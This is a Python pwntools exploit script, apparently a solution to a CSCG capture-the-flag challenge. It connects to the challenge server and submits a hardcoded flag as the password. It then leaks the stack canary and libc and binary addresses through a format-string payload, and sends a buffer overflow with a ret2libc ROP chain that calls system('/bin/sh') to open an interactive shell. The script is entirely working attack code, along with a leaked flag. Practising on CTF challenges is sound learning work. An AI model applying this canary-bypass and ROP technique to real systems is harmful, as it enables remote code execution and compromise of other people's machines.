from pwn import *

PASSWORD = "CSCG{NOW_GET_VOLDEMORT_!!}"
LIBC_START_MAIN_RET_OFFSET = 0x271e3
LIBC_SYSTEM_OFFSET = 0x554e0
LIBC_BIN_SH_OFFSET = 0x1b6613
WELCOME_RET_OFFSET = 0xd7e
POP_RDI = 0xdf3
RET = 0xdf4

p = remote("7b0000001c1cdf07f0506689-intro-pwn-3.challenge.broker.cscg.live", 31337, ssl=True)

p.recvuntil("Enter the password of stage 2:\n")
p.sendline(PASSWORD)

p.recvuntil("Enter your witch name:")
p.sendline("#%39$llu|%41$llu|%45$llu#")

p.recvuntil("#")
canary, ret_addr, libc_addr = map(int, p.recvuntil("#")[:-1].split(b"|"))
libc_addr -= LIBC_START_MAIN_RET_OFFSET
binary_addr = ret_addr - WELCOME_RET_OFFSET

log.info(f"Leaked stack canary: {canary:#x}")
log.info(f"Leaked binary address: {binary_addr:#x}")
log.info(f"Leaked libc address: {libc_addr:#x}")

p.recvuntil(":")

payload = b"Expelliarmus\0".ljust(0x108)
payload += p64(canary)
payload += b"A" * 8
payload += p64(binary_addr + POP_RDI)
payload += p64(libc_addr + LIBC_BIN_SH_OFFSET)
payload += p64(binary_addr + RET)
payload += p64(libc_addr + LIBC_SYSTEM_OFFSET)

p.sendline(payload)
p.interactive()
